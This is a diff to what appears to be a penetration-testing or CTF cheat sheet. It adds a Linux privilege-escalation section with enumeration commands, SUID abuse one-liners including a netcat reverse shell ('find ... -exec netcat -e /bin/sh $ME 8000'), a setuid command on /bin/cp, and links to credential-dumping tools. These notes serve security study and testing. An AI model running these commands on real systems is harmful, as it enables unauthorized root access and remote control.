@@ -92,9 +92,6 @@ Resources:
 
 # Good results
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-
-
 ```
 
 Resources:
@@ -282,9 +279,56 @@ Resources:
 
 ### Privilege Escalation
 
+Standard tools and techniques:
+
+```bash
+whoami
+uname -a
+
+history
+
+# cron
+cd /etc/cron.d/
+
+# SUID
+find / -perm -u=s -type f 2>/dev/null
+
+# root processes
+ps -aux | grep root
+
+# exploit search
+searchsploit Linux Kernel 2.6.24
+```
+
+SUID examples:
+
+```bash
+touch /tmp/a
+find /tmp/a -exec sh -i \;
+find /tmp/a -exec netcat -e /bin/sh $ME 8000 \;
+
+which cp
+ls -al /bin/cp
+chmod u+s /bin/cp
+
+nmap --interactive
+> !sh
+```
+
+Automated scripts:
+
 * `LinEnum.sh`
 * `linuxprivchecker.py`
 * `linuxprivchecker_python3.py`
+
+Resources:
+
+* https://pentestlab.blog/2017/09/25/suid-executables/
+* https://payatu.com/guide-linux-privilege-escalation/
+* https://github.com/AlessandroZ/LaZagne
+* https://github.com/rek7/mXtract
+
+
 
 ## Binaries
 
@@ -305,6 +349,8 @@ Resources:
 * Editor of choice: [wxHexEditor](https://www.wxhexeditor.org/)
   * Extract data using “Set Selection Block Start/End” > “Save As Dump”
 
+
+
 ## Misc
 
 ### Upgrading TTY
@@ -324,6 +370,15 @@ fg
 reset
 stty rows 24 cols 80
 ```
+
+### Bash tools
+
+```bash
+bind 'set completion-ignore-case on'
+alias ll="ls -lah"
+```
+
+
 
 ### String-related resources
 
